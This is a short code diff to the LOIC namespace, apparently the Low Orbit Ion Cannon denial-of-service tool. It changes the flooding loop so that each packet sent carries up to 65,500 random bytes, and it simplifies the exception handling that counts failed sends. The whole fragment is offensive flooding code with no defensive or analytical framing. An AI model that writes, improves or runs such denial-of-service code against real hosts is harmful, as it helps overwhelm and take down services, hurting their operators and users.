@@ -595,10 +595,15 @@ namespace LOIC
 
             while (this.IsFlooding)
             {
+                _BytesToSend = new Byte[0];
 
                 if (_RandomMessage)
                 {
+                    _BytesToSend = new Byte[65500];
                     //fill an array with 0 to 65499 random bytes bytes 
+
+
+
                     int b = 0;
                     while (b < _random.Next(0,65499))
                     {
@@ -606,10 +611,9 @@ namespace LOIC
                         b++;
                     }
                 }
-                else
-                {
-                    _BytesToSend = new Byte[0];
-                }
+               
+                    
+                
 
 
 
@@ -630,13 +634,7 @@ namespace LOIC
                         Requested++;
 
                     }
-                    catch (PingException)
-                    {
-
-                        //if not working for whatever reason this will show this.
-                        Failed++;
-
-                    }
+                   
                     catch (Exception)
                     {
                         Failed++;
